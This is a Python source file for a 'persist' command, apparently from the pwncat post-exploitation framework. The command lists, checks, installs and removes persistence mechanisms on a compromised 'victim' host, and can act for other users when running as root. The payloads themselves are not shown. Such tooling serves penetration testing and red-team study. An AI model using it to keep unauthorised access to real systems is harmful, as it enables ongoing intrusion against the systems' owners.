#!/usr/bin/env python3
from typing import Dict, Type, Tuple, Iterator

import pwncat
from pwncat.commands.base import CommandDefinition, Complete, parameter, StoreConstOnce
from pwncat.persist import PersistenceMethod, PersistenceError
from pwncat.util import Access
from colorama import Fore
from pwncat import util
import crypt
import os


class Command(CommandDefinition):
    """ Manage various persistence methods on the remote host """

    def get_method_choices(self):
        return [method.name for method in pwncat.victim.persist]

    def get_user_choices(self):
        """ Get the user options """
        current = pwncat.victim.current_user
        if current["name"] == "root" or current["uid"] == 0:
            return [name for name in pwncat.victim.users]
        else:
            return [current["name"]]

    PROG = "persist"
    ARGS = {
        "--method,-m": parameter(
            Complete.CHOICES,
            metavar="METHOD",
            help="Select a persistence method to deploy",
            choices=get_method_choices,
        ),
        "--user,-u": parameter(
            Complete.CHOICES,
            metavar="USER",
            help="For non-system persistence modules, the user to install as (only valid if currently UID 0)",
            choices=get_user_choices,
        ),
        "--status,-s": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            dest="action",
            const="status",
            help="Check the status of the given persistence method",
        ),
        "--install,-i": parameter(
            Complete.NONE,
            action=StoreConstOnce,
            nargs=0,
            dest="action",
            const="install",
            help="Install the selected persistence method",
        ),
        "--list,-l": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="list",
            help="List all available persistence methods",
        ),
        "--remove,-r": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="remove",
            help="Remove the selected persistence method",
        ),
        "--clean,-c": parameter(
            Complete.NONE,
            nargs=0,
            action=StoreConstOnce,
            dest="action",
            const="clean",
            help="Remove all installed persistence methods",
        ),
    }
    DEFAULTS = {"action": "status"}

    # List of available persistence methods
    METHODS: Dict[str, Type["PersistenceMethod"]] = {}

    @property
    def installed_methods(self) -> Iterator[Tuple[str, str, PersistenceMethod]]:
        me = pwncat.victim.current_user
        for method in pwncat.victim.persist:
            if method.system and method.installed():
                yield (method.name, None, method)
            elif not method.system:
                if me["uid"] == 0:
                    for user in pwncat.victim.users:
                        util.progress(f"checking {method.name} for: {user}")
                        if method.installed(user):
                            util.erase_progress()
                            yield (method.name, user, method)
                        util.erase_progress()
                else:
                    if method.installed(me["name"]):
                        yield (method.name, me["name"], method)

    def run(self, args):

        if args.action == "status":
            ninstalled = 0
            for name, user, method in self.installed_methods:
                print(f" - {method.format(user)} installed")
                ninstalled += 1
            if not ninstalled:
                util.warn(
                    "no persistence methods observed as "
                    f"{Fore.GREEN}{pwncat.victim.whoami()}{Fore.RED}"
                )
            return
        elif args.action == "list":
            for method in pwncat.victim.persist:
                print(f" - {method.format()}")
            return
        elif args.action == "clean":
            util.progress("cleaning persistence methods: ")
            for name, user, method in self.installed_methods:
                try:
                    util.progress(
                        f"cleaning persistance methods: {method.format(user)}"
                    )
                    method.remove(user)
                    util.success(f"removed {method.format(user)}")
                except PersistenceError as exc:
                    util.erase_progress()
                    util.warn(
                        f"{method.format(user)}: removal failed: {exc}\n", overlay=True
                    )
            util.erase_progress()
            return
        elif args.method is None:
            self.parser.error("no method specified")
            return

        # Lookup the method
        try:
            method = pwncat.victim.persist.find(args.method)
        except KeyError:
            self.parser.error(f"{args.method}: no such persistence method")
            return

        # Grab the user we want to install the persistence as
        if args.user:
            user = args.user
        else:
            # Default is to install as current user
            user = pwncat.victim.whoami()

        if args.action == "install":
            try:

                # Check that the module isn't already installed
                if method.installed(user):
                    util.error(f"{method.format(user)} already installed")
                    return

                util.success(f"installing {method.format(user)}")

                # Install the persistence
                method.install(user)
            except PersistenceError as exc:
                util.error(f"{method.format(user)}: install failed: {exc}")
        elif args.action == "remove":
            try:

                # Check that the module isn't already installed
                if not method.installed(user):
                    util.error(f"{method.format(user)} not installed")
                    return

                util.success(f"removing {method.format(user)}")

                # Remove the method
                method.remove(user)
            except PersistenceError as exc:
                util.error(f"{method.format(user)}: removal failed: {exc}")
